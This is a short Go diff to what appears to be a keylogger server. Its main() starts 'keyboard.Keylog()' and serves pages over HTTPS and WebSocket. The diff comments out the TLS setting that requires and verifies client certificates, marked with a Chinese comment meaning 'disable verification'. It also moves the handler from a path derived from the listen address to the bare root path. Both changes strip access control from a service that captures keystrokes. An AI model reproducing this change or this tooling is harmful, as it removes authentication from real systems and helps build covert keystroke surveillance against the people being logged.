@@ -65,7 +65,8 @@ func main() {
 	tlsConfig := &tls.Config{
 		Certificates: []tls.Certificate{cert},
 		ClientCAs:    certPool,
-		ClientAuth:   tls.RequireAndVerifyClientCert,
+		// 关闭验证
+		//ClientAuth:   tls.RequireAndVerifyClientCert,
 	}
 
 	// Use the same listener for both HTTPS and WebSocket
@@ -79,7 +80,9 @@ func main() {
 	go keyboard.Keylog()
 
 	// Define HTTPS handlers
-	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
+	// 固定访问地址
+	//http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html")
 		contentBytes, err := templates.ReadFile("index.html")
 		if err != nil {
